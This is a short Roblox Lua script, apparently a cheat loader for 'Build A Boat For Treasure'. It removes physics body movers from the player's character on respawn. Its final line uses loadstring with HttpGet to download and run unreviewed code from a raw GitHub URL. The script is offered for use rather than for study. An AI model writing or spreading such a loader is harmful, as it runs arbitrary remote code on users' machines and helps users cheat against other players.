local Players = game:GetService("Players")
local localPlayer = Players.LocalPlayer

localPlayer.CharacterAdded:Connect(function(newChar)
    local hum = newChar:WaitForChild("Humanoid", 10)
    local hrp = newChar:WaitForChild("HumanoidRootPart", 10)
    
    if hum and hrp then
        task.wait(1)
        for _, v in ipairs(hrp:GetChildren()) do
            if v:IsA("BodyVelocity") or v:IsA("BodyGyro") or v:IsA("BodyPosition") then
                v:Destroy()
            end
        end
    end
end)

loadstring(game:HttpGet("https://raw.githubusercontent.com/argperks-ui/Babft-Script/refs/heads/main/Babft%20script"))()